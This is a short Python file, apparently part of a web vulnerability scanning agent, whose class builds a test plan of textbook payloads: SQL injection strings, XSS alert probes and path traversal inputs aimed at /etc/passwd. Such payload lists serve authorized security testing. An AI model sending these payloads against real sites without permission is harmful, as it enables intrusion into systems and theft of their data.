# agents/kljucar.py

class Kljucar:
    def __init__(self, site_data=None):
        self.site_data = site_data

    def generate_plan(self, modules):
        plan = []
        for modul in modules:
            if modul == "SQL Injection":
                plan.append({
                    "name": "SQL Injection",
                    "payloads": [
                        "' OR 1=1 --",
                        "' UNION SELECT NULL, NULL --",
                        "\" OR \"\" = \"\"",
                    ]
                })
            elif modul == "XSS":
                plan.append({
                    "name": "XSS",
                    "payloads": [
                        "<script>alert(1)</script>",
                        "<img src=x onerror=alert(1)>",
                    ]
                })
            elif modul == "LFI":
                plan.append({
                    "name": "LFI",
                    "payloads": [
                        "../../etc/passwd",
                        "../../../../../../etc/passwd",
                    ]
                })
        return plan
